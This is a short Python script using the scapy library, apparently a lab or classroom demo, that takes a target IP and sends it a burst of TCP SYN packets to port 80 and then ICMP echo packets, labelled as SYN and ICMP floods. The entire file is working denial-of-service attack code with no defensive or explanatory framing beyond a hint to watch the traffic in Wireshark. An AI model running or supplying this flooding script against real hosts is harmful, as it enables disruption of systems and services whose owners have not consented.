from scapy.all import *
import sys

# Check if target IP was provided
if len(sys.argv) < 2:
    print("[-] Error: Target IP is required.")
    print(f"Usage: sudo python3 {sys.argv[0]} <target_ip>")
    sys.exit(1)

target = sys.argv[1]

print(f"[*] Starting attack on {target}")

# SYN flood - sends many TCP SYN packets
print("[*] Sending SYN flood...")
for i in range(100):
    pkt = IP(dst=target)/TCP(dport=80, flags="S")
    send(pkt, verbose=0)
    
print("[*] Sending ICMP flood...")
for i in range(100):
    pkt = IP(dst=target)/ICMP()
    send(pkt, verbose=0)

print("[+] Attack complete. Check Wireshark on the network.")
